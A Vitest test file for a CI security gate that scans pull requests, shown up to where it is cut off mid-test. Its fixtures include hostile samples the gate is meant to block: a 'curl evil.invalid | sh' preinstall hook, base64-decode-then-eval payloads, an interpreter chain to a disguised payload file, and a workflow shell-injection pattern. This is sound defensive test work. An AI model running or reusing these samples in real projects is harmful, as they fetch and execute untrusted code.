import { execFileSync } from 'node:child_process';
import {
  access,
  mkdir,
  mkdtemp,
  readFile,
  rm,
  writeFile
} from 'node:fs/promises';
import { createHash } from 'node:crypto';
import os from 'node:os';
import path from 'node:path';
import { gunzipSync, gzipSync } from 'node:zlib';
import { afterEach, describe, expect, it } from 'vitest';
import {
  buildStageAFeedback,
  currentMaintainerApproval,
  currentOwnerAttestation,
  fetchCurrentMaintainerApproval,
  fetchHeadCommitVerification,
  parseStageAExceptionPolicy,
  matchingStageAExceptions,
  scanGithubPullRequest,
  scanGitTree,
  compareNpmLockfiles,
  inspectDependencyChanges,
  inspectGoArtifacts,
  inspectGoModuleZip,
  parseGoModuleArtifactInventory,
  listPullRequestChanges,
  parseNpmLockInventory,
  inspectNpmArtifacts,
  inspectNpmTarball,
  scanText,
  verifyPullRequestMergeParents,
  stageAAuthorshipReviewSignals,
  workflowRunCommands
} from '../../scripts/stage-a-gate.mjs';

const roots: string[] = [];
const markers: string[] = [];
const fakeGithubToken = ['ghp_', '123456789012345678901234567890'].join('');

// Assemble inert adversarial samples at runtime so Stage A scans the test
// harness as code rather than mistaking its fixture data for live behavior.
function fixtureSource(...parts: string[]): string {
  return parts.join('');
}

function storedZip(entries: Array<[string, string]>): Buffer {
  const localParts: Buffer[] = [];
  const centralParts: Buffer[] = [];
  let offset = 0;
  for (const [name, text] of entries) {
    const nameBytes = Buffer.from(name);
    const content = Buffer.from(text);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(content.length, 18);
    local.writeUInt16LE(content.length, 22);
    local.writeUInt16LE(nameBytes.length, 26);
    localParts.push(local, nameBytes, content);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(content.length, 20);
    central.writeUInt16LE(content.length, 24);
    central.writeUInt16LE(nameBytes.length, 28);
    central.writeUInt32LE(offset, 42);
    centralParts.push(central, nameBytes);
    offset += local.length + nameBytes.length + content.length;
  }
  const centralOffset = offset;
  const central = Buffer.concat(centralParts);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(central.length, 12);
  eocd.writeUInt32LE(centralOffset, 16);
  return Buffer.concat([...localParts, central, eocd]);
}

function npmTarball(entries: Array<[string, string | Buffer]>): Buffer {
  const blocks: Buffer[] = [];
  for (const [name, text] of entries) {
    const content = Buffer.isBuffer(text) ? text : Buffer.from(text);
    const header = Buffer.alloc(512);
    header.write(name, 0, 100, 'utf8');
    header.write('0000644\0', 100, 8, 'ascii');
    header.write('0000000\0', 108, 8, 'ascii');
    header.write('0000000\0', 116, 8, 'ascii');
    header.write(
      `${content.length.toString(8).padStart(11, '0')}\0`,
      124,
      12,
      'ascii'
    );
    header.write('00000000000\0', 136, 12, 'ascii');
    header.fill(32, 148, 156);
    header[156] = 48;
    header.write('ustar\0', 257, 6, 'ascii');
    header.write('00', 263, 2, 'ascii');
    const checksum = header.reduce((total, byte) => total + byte, 0);
    header.write(
      `${checksum.toString(8).padStart(6, '0')}\0 `,
      148,
      8,
      'ascii'
    );
    blocks.push(header);
    const padded = Buffer.alloc(Math.ceil(content.length / 512) * 512);
    content.copy(padded);
    blocks.push(padded);
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}

function artifact(
  archive: Buffer,
  overrides: Partial<{
    location: string;
    name: string;
    resolved: string;
    integrity: string;
    hasInstallScript: boolean;
  }> = {}
) {
  return {
    location: 'node_modules/example',
    name: 'example',
    version: '2.0.0',
    resolved: 'https://registry.npmjs.org/example/-/example-2.0.0.tgz',
    integrity: `sha512-${createHash('sha512').update(archive).digest('base64')}`,
    hasInstallScript: false,
    ...overrides
  };
}
afterEach(async () =>
  Promise.all([
    ...roots
      .splice(0)
      .map((root) => rm(root, { recursive: true, force: true })),
    ...markers.splice(0).map((marker) => rm(marker, { force: true }))
  ])
);

async function repo(
  files: Record<string, string | Buffer>
): Promise<{ root: string; sha: string }> {
  const root = await mkdtemp(path.join(os.tmpdir(), 'toolip-stage-a-'));
  roots.push(root);
  execFileSync('git', ['init', '-q', root]);
  for (const [name, value] of Object.entries(files)) {
    const target = path.join(root, name);
    await mkdir(path.dirname(target), { recursive: true });
    await writeFile(target, value);
  }
  const git = (args: string[]) =>
    execFileSync(
      'git',
      ['-C', root, '-c', 'core.hooksPath=/dev/null', ...args],
      { encoding: 'utf8' }
    ).trim();
  git(['add', '--all']);
  git([
    '-c',
    'user.name=Toolip Test',
    '-c',
    'user.email=test@example.invalid',
    'commit',
    '-qm',
    'fixture'
  ]);
  return { root, sha: git(['rev-parse', 'HEAD']) };
}

describe('trusted Stage A Git-object scanner', () => {
  it('does not read prose beginning with executable as a source signature', async () => {
    const fixture = await repo({
      'docs/release-notes.md':
        'Executable guide: `tar -x archive.tar`\nNode 24 is supported.\n'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['docs/release-notes.md']
    });
    expect(result.findings).not.toContain(
      'docs/release-notes.md#archive-execution'
    );
  });

  it('ignores dependency lockfiles embedded in inert test fixtures', async () => {
    const fixture = await repo({
      'tests/fixtures/js/yarn.lock': 'fixture-package@^1.0.0:\n',
      'tests/fixtures/rust/Cargo.toml': '[package]\nname="fixture"\n',
      'tests/fixtures/rust/Cargo.lock': 'version = 3\n'
    });

    const result = inspectDependencyChanges(
      fixture.root,
      fixture.sha,
      fixture.sha
    );
    expect(result.reasons).not.toContain('unsupported-lockfile-format');
    expect(result.reasons).not.toContain(
      'unsupported-dependency-ecosystem-provenance'
    );
    expect(result.cargoArtifactCount).toBe(0);
  });

  it('surfaces fork, external-author, and commit-signature review requirements without treating them as malicious', async () => {
    const fork = stageAAuthorshipReviewSignals({
      authorAssociation: 'FIRST_TIME_CONTRIBUTOR',
      headRepository: 'contributor/toolip',
      headIsFork: true,
      baseRepository: 'wbizmo/toolip',
      headCommitVerification: { verified: false, reason: 'unsigned' }
    });
    expect(fork.incompleteReasons).toEqual([]);
    expect(fork.signals.map(({ id }) => id)).toEqual([
      'external-author-association',
      'fork-head-repository',
      'head-commit-signature-unverified'
    ]);
    expect(fork.signals.every((signal) => signal.reviewRequired)).toBe(true);
    expect(
      buildStageAFeedback({
        status: 'approved',
        reasonCodes: [],
        findings: [],
        reviewSignals: fork.signals
      }).sarif.runs[0]?.properties.reviewSignals
    ).toEqual(fork.signals);

    const sameRepository = stageAAuthorshipReviewSignals({
      authorAssociation: 'MEMBER',
      headRepository: 'wbizmo/toolip',
      headIsFork: false,
      baseRepository: 'wbizmo/toolip',
      headCommitVerification: { verified: true, reason: 'valid' }
    });
    expect(sameRepository).toEqual({ signals: [], incompleteReasons: [] });

    const unavailable = stageAAuthorshipReviewSignals({
      authorAssociation: undefined,
      headRepository: undefined,
      headIsFork: undefined,
      baseRepository: 'wbizmo/toolip'
    });
    expect(unavailable.incompleteReasons).toEqual([
      'head-commit-verification-unavailable',
      'pull-request-author-context-unavailable',
      'pull-request-repository-context-unavailable'
    ]);

    await expect(
      fetchHeadCommitVerification({
        repository: 'wbizmo/toolip',
        headSha: 'b'.repeat(40),
        token: 'x'.repeat(32),
        fetchImpl: async (url) => {
          expect(String(url)).toBe(
            `https://api.github.com/repos/wbizmo/toolip/commits/${'b'.repeat(40)}`
          );
          return new Response(
            JSON.stringify({
              sha: 'b'.repeat(40),
              commit: {
                verification: {
                  verified: false,
                  reason: 'unsigned',
                  signature: 'private commit signature must not escape'
                }
              }
            }),
            { status: 200 }
          );
        }
      })
    ).resolves.toEqual({ verified: false, reason: 'unsigned' });
    await expect(
      fetchHeadCommitVerification({
        repository: 'wbizmo/toolip',
        headSha: 'b'.repeat(40),
        token: 'x'.repeat(32),
        fetchImpl: async () => new Response('', { status: 302 })
      })
    ).rejects.toThrow('head-commit-verification-provider-unavailable');
    for (const payload of [
      {
        sha: 'c'.repeat(40),
        commit: { verification: { verified: true, reason: 'valid' } }
      },
      {
        sha: 'b'.repeat(40),
        commit: { verification: { verified: true, reason: 'unsigned' } }
      },
      {
        sha: 'b'.repeat(40),
        commit: { verification: { verified: false, reason: 'valid' } }
      }
    ]) {
      await expect(
        fetchHeadCommitVerification({
          repository: 'wbizmo/toolip',
          headSha: 'b'.repeat(40),
          token: 'x'.repeat(32),
          fetchImpl: async () =>
            new Response(JSON.stringify(payload), { status: 200 })
        })
      ).rejects.toThrow('head-commit-verification-response-invalid');
    }
  });

  it('accepts only exact owner attestations for already verified artifact digests', () => {
    const now = Date.parse('2026-11-22T18:00:00.000Z');
    const headSha = 'a'.repeat(40);
    const treeSha = 'b'.repeat(64);
    const archiveSha = 'c'.repeat(128);
    const reason =
      'unsupported-toolchain-execution:artifact:node_modules/esbuild/bin/esbuild:node_modules/esbuild';
    const exception = {
      id: 'owner-reviewed-esbuild-exec',
      reasonCode: 'unsupported-toolchain-execution',
      exactReason: reason,
      headInputSha256: treeSha,
      expiresAt: '2026-11-25T18:00:00.000Z',
      rationale:
        'Reviewed the exact pinned archive and accepted the remaining static-analysis uncertainty.',
      ownerAttestation: {
        owner: 'wbizmo',
        headSha,
        attestedAt: '2026-11-22T17:00:00.000Z',
        artifactLocation: 'node_modules/esbuild',
        artifactSha512: archiveSha
      }
    };
    const policy = parseStageAExceptionPolicy(
      JSON.stringify({ version: 1, exceptions: [exception] }),
      now
    );
    expect(policy.invalid).toBe(false);
    const candidate = policy.entries[0];
    const input = {
      repository: 'wbizmo/toolip',
      headSha,
      headInputSha256: treeSha,
      incompleteReasons: [reason],
      verifiedArtifactSha512ByLocation: { 'node_modules/esbuild': archiveSha }
    };
    expect(currentOwnerAttestation(candidate, input)).toMatchObject({
      login: 'wbizmo',
      commitId: headSha
    });
    expect(
      currentOwnerAttestation(candidate, { ...input, headSha: 'd'.repeat(40) })
    ).toBeUndefined();
    expect(
      currentOwnerAttestation(candidate, {
        ...input,
        verifiedArtifactSha512ByLocation: {
          'node_modules/esbuild': 'e'.repeat(128)
        }
      })
    ).toBeUndefined();
    expect(
      currentOwnerAttestation(candidate, { ...input, incompleteReasons: [] })
    ).toBeUndefined();
    expect(
      currentOwnerAttestation(candidate, {
        ...input,
        repository: 'someone/toolip'
      })
    ).toBeUndefined();
    expect(
      parseStageAExceptionPolicy(
        JSON.stringify({
          version: 1,
          exceptions: [{ ...exception, expiresAt: '2026-12-12T00:00:00.000Z' }]
        }),
        now
      ).invalid
    ).toBe(true);
    expect(
      parseStageAExceptionPolicy(
        JSON.stringify({
          version: 1,
          exceptions: [
            { ...exception, reasonCode: 'scoped-artifact-fetch-withheld' }
          ]
        }),
        now
      ).invalid
    ).toBe(true);
  });

  it('accepts only exact-tree, short-lived exception entries and current maintainer approvals', async () => {
    const now = Date.parse('2026-11-07T00:00:00.000Z');
    const policy = parseStageAExceptionPolicy(
      JSON.stringify({
        version: 1,
        exceptions: [
          {
            id: 'known-false-positive',
            findingId: 'a'.repeat(64),
            headInputSha256: 'b'.repeat(64),
            expiresAt: '2026-11-20T00:00:00.000Z',
            rationale: 'Reviewed parser false positive for this exact tree.'
          },
          {
            id: 'expired-entry',
            reasonCode: 'workflow-permission-expansion-review',
            headInputSha256: 'c'.repeat(64),
            expiresAt: '2026-11-01T00:00:00.000Z',
            rationale: 'This exception is expired and must not be applied.'
          }
        ]
      }),
      now
    );
    expect(policy.invalid).toBe(false);
    expect(policy.entries.map((entry) => entry.id)).toEqual([
      'known-false-positive'
    ]);
    expect(
      parseStageAExceptionPolicy(
        JSON.stringify({
          version: 1,
          exceptions: [
            {
              id: 'too-long',
              reasonCode: 'workflow-permission-expansion-review',
              headInputSha256: 'd'.repeat(64),
              expiresAt: '2027-01-01T00:00:00.000Z',
              rationale: 'An exception that exceeds the maximum lifetime.'
            }
          ]
        }),
        now
      ).invalid
    ).toBe(true);

    const approvedReview = {
      user: { login: 'maintainer' },
      author_association: 'MEMBER',
      state: 'APPROVED',
      commit_id: 'b'.repeat(40),
      submitted_at: '2026-11-06T10:00:00Z'
    };
    expect(
      currentMaintainerApproval([approvedReview], 'b'.repeat(40), 'contributor')
    ).toMatchObject({ login: 'maintainer', commitId: 'b'.repeat(40) });
    expect(
      currentMaintainerApproval(
        [
          approvedReview,
          {
            ...approvedReview,
            state: 'CHANGES_REQUESTED',
            submitted_at: '2026-11-06T11:00:00Z'
          }
        ],
        'b'.repeat(40),
        'contributor'
      )
    ).toBeUndefined();
    expect(
      currentMaintainerApproval([approvedReview], 'b'.repeat(40), 'maintainer')
    ).toBeUndefined();

    let requestedUrl = '';
    let authorization = '';
    await expect(
      fetchCurrentMaintainerApproval({
        repository: 'wbizmo/toolip',
        number: 123,
        headSha: 'b'.repeat(40),
        pullRequestAuthor: 'contributor',
        token: 'x'.repeat(32),
        fetchImpl: async (url, options) => {
          requestedUrl = String(url);
          authorization = String(options.headers.authorization);
          return new Response(JSON.stringify([approvedReview]), {
            status: 200,
            headers: { link: '' }
          });
        }
      })
    ).resolves.toMatchObject({ login: 'maintainer' });
    expect(requestedUrl).toBe(
      'https://api.github.com/repos/wbizmo/toolip/pulls/123/reviews?per_page=100&page=1'
    );
    expect(authorization).toBe(`Bearer ${'x'.repeat(32)}`);
    await expect(
      fetchCurrentMaintainerApproval({
        repository: 'wbizmo/toolip',
        number: 123,
        headSha: 'b'.repeat(40),
        pullRequestAuthor: 'contributor',
        token: 'x'.repeat(32),
        fetchImpl: async () => new Response('', { status: 302 })
      })
    ).rejects.toThrow('maintainer-review-provider-unavailable');
  });

  it('matches reviewed exceptions for dependency artifact findings and coverage reasons only on the exact tree', () => {
    const digest = 'f'.repeat(64);
    const dependencyFinding = 'a'.repeat(64);
    const entries = [
      {
        id: 'reviewed-artifact-finding',
        findingId: dependencyFinding,
        headInputSha256: digest
      },
      {
        id: 'reviewed-artifact-lifecycle',
        reasonCode: 'dependency-lifecycle-script-review',
        headInputSha256: digest
      },
      {
        id: 'stale-artifact-finding',
        findingId: 'b'.repeat(64),
        headInputSha256: 'e'.repeat(64)
      }
    ];

    expect(
      matchingStageAExceptions(
        entries,
        digest,
        [dependencyFinding],
        ['dependency-lifecycle-script-review:node_modules/example']
      ).map(({ id }) => id)
    ).toEqual(['reviewed-artifact-finding', 'reviewed-artifact-lifecycle']);
    expect(
      matchingStageAExceptions(
        entries,
        'e'.repeat(64),
        [dependencyFinding],
        ['dependency-lifecycle-script-review:node_modules/example']
      )
    ).toEqual([]);
  });

  it('emits deterministic redacted SARIF diagnostics with concise execution traces', () => {
    const result = {
      status: 'blocked',
      reasonCodes: ['suspicious-content'],
      coverage: { files: 2 },
      findings: [
        'execution-chain:src/boot.js -> src/token.js?token=private-value',
        `src/config#npm.lifecycle:token=${fakeGithubToken}`
      ]
    };
    const feedback = buildStageAFeedback(result);
    const sarifText = JSON.stringify(feedback.sarif);

    expect(feedback.sarif.version).toBe('2.1.0');
    expect(feedback.findings).toHaveLength(2);
    expect(feedback.findings[0]?.id).toMatch(/^[a-f0-9]{64}$/u);
    expect(sarifText).not.toContain('private-value');
    expect(sarifText).not.toContain('ghp_123456789012345678901234567890');
    expect(sarifText).toContain('[redacted]');
    expect(sarifText).toContain('src/boot.js -> src/token.js');
    expect(
      buildStageAFeedback({
        ...result,
        findings: [...result.findings].reverse()
      })
    ).toEqual(feedback);
  });

  it('reports an incomplete scanner result as a stable SARIF gate error', () => {
    const first = buildStageAFeedback({
      status: 'error',
      reasonCodes: ['scanner-unavailable'],
      findings: []
    });
    const second = buildStageAFeedback({
      status: 'error',
      reasonCodes: ['scanner-unavailable'],
      findings: []
    });

    expect(first.findings[0]).toMatchObject({
      ruleId: 'TLP-STAGEA-GATE-ERROR',
      location: 'Stage A trusted scanner'
    });
    expect(first.findings[0]?.id).toBe(second.findings[0]?.id);
    expect(
      buildStageAFeedback({
        status: 'incomplete',
        reasonCodes: ['workflow-permission-expansion-review'],
        findings: []
      }).findings[0]
    ).toMatchObject({ ruleId: 'TLP-STAGEA-GATE-ERROR' });
  });

  it('reads exact commit blobs without checking them out or executing package scripts', async () => {
    const marker = path.join(
      os.tmpdir(),
      `toolip-stage-a-sentinel-${process.pid}`
    );
    markers.push(marker);
    const fixture = await repo({
      'package.json': JSON.stringify({
        name: 'fixture',
        scripts: { prepare: 'node test.js' }
      }),
      'test.js': `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'ran')`,
      'src/main.ts': 'export const value = 1;'
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result).toMatchObject({
      status: 'approved',
      files: 3,
      commit: fixture.sha
    });
    expect(result.inputSha256).toMatch(/^[a-f0-9]{64}$/u);
    await expect(access(marker)).rejects.toThrow();
    await expect(
      access(path.join(fixture.root, 'src/main.ts'))
    ).resolves.toBeUndefined();
  });

  it('rejects malicious workflow commands before a project-owned sentinel can run', async () => {
    const marker = path.join(
      os.tmpdir(),
      `toolip-stage-a-blocked-sentinel-${process.pid}`
    );
    markers.push(marker);
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'node test.js' }
      }),
      'test.js': `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'ran'); const payload = atob('ZXZpbA=='); eval(payload);`
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:package.json -> test.js'
    );
    await expect(access(marker)).rejects.toThrow();
  });

  it('blocks suspicious lifecycle commands and malformed manifests', async () => {
    const suspicious = await repo({
      'package.json': JSON.stringify({
        scripts: { preinstall: 'curl https://evil.invalid/x | sh' }
      })
    });
    expect(scanGitTree(suspicious.root, suspicious.sha).status).toBe('blocked');
    const malformed = await repo({ 'package.json': '{not json' });
    expect(() => scanGitTree(malformed.root, malformed.sha)).toThrow(
      'Malformed execution manifest'
    );
    const malformedScripts = await repo({
      'package.json': JSON.stringify({ scripts: ['npm run build'] })
    });
    expect(() =>
      scanGitTree(malformedScripts.root, malformedScripts.sha)
    ).toThrow('Malformed package scripts');
  });

  it('does not block a documentation change on unchanged project scanner heuristics', async () => {
    const fixture = await repo({
      'README.md': 'Documentation update.\n',
      'scripts/stage-a-gate.mjs': 'spawnSync(command, args, options);\n',
      'scripts/release-check.sh': 'npm install\n'
    });
    expect(
      scanGitTree(fixture.root, fixture.sha, { changedPaths: ['README.md'] })
    ).toMatchObject({
      status: 'approved',
      findings: [],
      incompleteReasons: []
    });
  });

  it('still blocks suspicious content when the flagged file changed', async () => {
    const fixture = await repo({
      'payload.js': 'const payload = atob(encoded); eval(payload);\n'
    });
    expect(
      scanGitTree(fixture.root, fixture.sha, { changedPaths: ['payload.js'] })
        .status
    ).toBe('blocked');
  });

  it('keeps unsupported build toolchains incomplete before Stage B can execute them', async () => {
    const packageScript = await repo({
      'package.json': JSON.stringify({
        scripts: { verify: 'cargo build --locked' }
      })
    });
    expect(scanGitTree(packageScript.root, packageScript.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'unsupported-toolchain-execution:package.json#scripts.verify'
      ]
    });

    const workflow = await repo({
      '.github/workflows/build.yml': [
        'name: Build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: cargo build --locked',
        ''
      ].join('\n')
    });
    expect(scanGitTree(workflow.root, workflow.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'unsupported-toolchain-execution:.github/workflows/build.yml'
      ]
    });

    const spawned = await repo({
      'src/build.ts': [
        "import { spawnSync } from 'node:child_process';",
        "spawnSync('cargo', ['build', '--locked']);",
        ''
      ].join('\n')
    });
    expect(scanGitTree(spawned.root, spawned.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-toolchain-execution:src/build.ts']
    });

    const npmSpawned = await repo({
      'src/install.js': [
        "import { execFileSync } from 'node:child_process';",
        "execFileSync('npm', ['install', 'untrusted-package@latest']);",
        ''
      ].join('\n')
    });
    expect(scanGitTree(npmSpawned.root, npmSpawned.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-toolchain-execution:src/install.js']
    });

    const npmShellCommand = await repo({
      'src/install.ts': [
        "import { execSync } from 'node:child_process';",
        "execSync('npm install untrusted-package@latest');",
        ''
      ].join('\n')
    });
    expect(
      scanGitTree(npmShellCommand.root, npmShellCommand.sha)
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-toolchain-execution:src/install.ts']
    });

    const python = await repo({
      'tools/build.py': [
        'import subprocess',
        "subprocess.run(['cargo', 'build', '--locked'], check=True)",
        ''
      ].join('\n')
    });
    expect(scanGitTree(python.root, python.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-toolchain-execution:tools/build.py']
    });

    const rust = await repo({
      'src/build.rs': [
        'use std::process::Command;',
        'fn main() { Command::new("cargo").arg("build").status().unwrap(); }',
        ''
      ].join('\n')
    });
    expect(scanGitTree(rust.root, rust.sha)).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-toolchain-execution:src/build.rs']
    });

    const documentation = await repo({
      'README.md': 'To build the Rust example, run `cargo build --locked`.\n'
    });
    expect(scanGitTree(documentation.root, documentation.sha).status).toBe(
      'approved'
    );
  });

  it('rejects unterminated JSONC block comments instead of approving editor tasks', async () => {
    const fixture = await repo({
      '.vscode/tasks.json': '{"tasks":[{"command":"node init"}], /* unfinished'
    });
    expect(() => scanGitTree(fixture.root, fixture.sha)).toThrow(
      'Malformed execution manifest'
    );
  });

  it('fails closed on malformed editor task schemas and dynamic auto-run targets', async () => {
    const malformed = await repo({
      '.vscode/tasks.json': JSON.stringify({ tasks: { runOn: 'folderOpen' } })
    });
    expect(() => scanGitTree(malformed.root, malformed.sha)).toThrow(
      'Malformed editor task list'
    );

    const malformedRunOptions = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'unknown trigger',
            runOptions: { runOn: 'startup' },
            command: 'node init'
          }
        ]
      })
    });
    expect(() =>
      scanGitTree(malformedRunOptions.root, malformedRunOptions.sha)
    ).toThrow('Malformed editor task command');

    const dynamic = await repo({
      '.vscode/tasks.json': JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'dynamic folder task',
            runOptions: { runOn: 'folderOpen' },
            command: 'node',
            args: ['${' + 'workspaceFolder}/init']
          }
        ]
      })
    });
    expect(
      scanGitTree(dynamic.root, dynamic.sha, {
        changedPaths: ['.vscode/tasks.json']
      })
    ).toMatchObject({
      status: 'incomplete',
      reasonCodes: ['execution-reference-coverage-incomplete']
    });
  });

  it('traces common interpreter chains to unchanged disguised blobs', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'cmd /c init.cmd' }
      }),
      'init.cmd': 'php payload.orc',
      'payload.orc': 'eval(atob(encoded_source))'
    });

    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });

    expect(result.status).toBe('blocked');
    expect(result.findings).toContain('payload.orc');
    expect(result.findings).toContain(
      'execution-chain:package.json -> init.cmd -> payload.orc'
    );
  });

  it('fails closed when the requested tree is unavailable', async () => {
    const fixture = await repo({ 'safe.txt': 'safe' });
    expect(() => scanGitTree(fixture.root, 'f'.repeat(40))).toThrow();
  });

  it('rejects invalid GitHub identities and missing read-only credentials before fetch', async () => {
    await expect(
      scanGithubPullRequest({
        repository: '../outside',
        number: 1,
        baseSha: 'a'.repeat(40),
        headSha: 'b'.repeat(40),
        mergeSha: 'c'.repeat(40),
        token: 'x'.repeat(32)
      })
    ).rejects.toThrow('GitHub repository identity is invalid');
    await expect(
      scanGithubPullRequest({
        repository: 'wbizmo/toolip',
        number: 1,
        baseSha: 'a'.repeat(40),
        headSha: 'b'.repeat(40),
        mergeSha: 'c'.repeat(40),
        token: ''
      })
    ).rejects.toThrow('Read-only GitHub token is unavailable');
  });

  it('binds the scanned immutable merge tree to the event base and PR head', async () => {
    const fixture = await repo({ 'base.txt': 'base' });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    git(['checkout', '-qb', 'feature']);
    await writeFile(path.join(fixture.root, 'head.txt'), 'head');
    git(['add', 'head.txt']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'head'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    git(['checkout', '-q', fixture.sha]);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'merge',
      '--no-ff',
      '--no-edit',
      'feature'
    ]);
    const merge = git(['rev-parse', 'HEAD']);
    expect(() =>
      verifyPullRequestMergeParents(fixture.root, merge, fixture.sha, head)
    ).not.toThrow();
    expect(() =>
      verifyPullRequestMergeParents(
        fixture.root,
        merge,
        fixture.sha,
        'd'.repeat(40)
      )
    ).toThrow('does not contain');
  });

  it('blocks untrusted event interpolation in GitHub Actions shell steps', async () => {
    const fixture = await repo({
      '.github/workflows/ci.yml': [
        'name: unsafe',
        'on: pull_request_target',
        'jobs:',
        '  test:',
        '    steps:',
        '      - run: echo "$' + '{' + '{ github.event.issue.title }}"'
      ].join('\n')
    });
    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
      status: 'blocked'
    });
  });

  it('blocks changed workflows with mutable actions and requires review for write permissions', async () => {
    const mutable = await repo({ 'safe.txt': 'safe' });
    const workflow = [
      'name: check',
      'on: pull_request',
      'permissions:',
      '  contents: read',
      'jobs:',
      '  test:',
      '    steps:',
      '      - name: checkout',
      '        uses: actions/checkout@v4'
    ].join('\n');
    await mkdir(path.join(mutable.root, '.github/workflows'), {
      recursive: true
    });
    await writeFile(
      path.join(mutable.root, '.github/workflows/ci.yml'),
      workflow
    );
    execFileSync('git', ['-C', mutable.root, 'add', '--all']);
    execFileSync('git', [
      '-C',
      mutable.root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'add mutable workflow action'
    ]);
    const mutableHead = execFileSync(
      'git',
      ['-C', mutable.root, 'rev-parse', 'HEAD'],
      { encoding: 'utf8' }
    ).trim();
    const mutableResult = scanGitTree(mutable.root, mutableHead, {
      changedPaths: ['.github/workflows/ci.yml']
    });
    expect(mutableResult.status).toBe('blocked');
    expect(mutableResult.findings).toContain(
      '.github/workflows/ci.yml#unpinned-action'
    );

    const writable = await repo({
      '.github/workflows/ci.yml': [
        'name: check',
        'on: pull_request',
        'permissions:',
        '  contents: write',
        'jobs:',
        '  test:',
        '    steps:',
        '      - name: checkout',
        '        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'
      ].join('\n')
    });
    expect(
      scanGitTree(writable.root, writable.sha, {
        changedPaths: ['.github/workflows/ci.yml']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'workflow-permission-expansion-review',
        'workflow-trust-root-change-review'
      ]
    });

    const localAction = await repo({
      '.github/workflows/ci.yml': [
        'name: check',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - name: local action',
        '        uses: ./actions/build'
      ].join('\n')
    });
    expect(
      scanGitTree(localAction.root, localAction.sha, {
        changedPaths: ['.github/workflows/ci.yml']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: [
        'local-action-execution-unverified:.github/workflows/ci.yml',
        'workflow-local-action-review',
        'workflow-trust-root-change-review'
      ]
    });

    const dockerAction = await repo({
      '.github/workflows/ci.yml': [
        'name: check',
        'on: pull_request',
        'jobs:',
        '  test:',
        '    steps:',
        '      - name: container action',
        '        uses: docker://alpine:3'
      ].join('\n')
    });
    expect(
      scanGitTree(dockerAction.root, dockerAction.sha, {
        changedPaths: ['.github/workflows/ci.yml']
      })
    ).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/ci.yml#unpinned-action']
    });

    const privilegedTrigger = await repo({
      '.github/workflows/ci.yml': [
        'name: check',
        'on: pull_request_target',
        'permissions: read-all',
        'jobs:',
        '  test:',
        '    steps:',
        '      - name: checkout',
        '        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'
      ].join('\n')
    });
    expect(
      scanGitTree(privilegedTrigger.root, privilegedTrigger.sha, {
        changedPaths: ['.github/workflows/ci.yml']
      })
    ).toMatchObject({
      status: 'blocked',
      findings: ['.github/workflows/ci.yml#privileged-pull-request-trigger']
    });
  });

  it('requires review when a Stage A scanner, verifier or trust-root workflow changes', async () => {
    const workflow = await repo({
      '.github/workflows/stage-a.yml': [
        'name: trusted gate',
        'on: pull_request_target',
        'permissions:',
        '  contents: read',
        'jobs: {}'
      ].join('\n')
    });
    expect(
      scanGitTree(workflow.root, workflow.sha, {
        changedPaths: ['.github/workflows/stage-a.yml']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['workflow-trust-root-change-review']
    });

    const codeowners = await repo({
      '.github/CODEOWNERS': '/.github/workflows/ @wbizmo\n'
    });
    expect(
      scanGitTree(codeowners.root, codeowners.sha, {
        changedPaths: ['.github/CODEOWNERS']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['workflow-trust-root-change-review']
    });

    const scanner = await repo({
      'scripts/stage-a-gate.mjs': 'export const reviewed = true;\n'
    });
    expect(
      scanGitTree(scanner.root, scanner.sha, {
        changedPaths: ['scripts/stage-a-gate.mjs']
      })
    ).toMatchObject({
      status: 'incomplete',
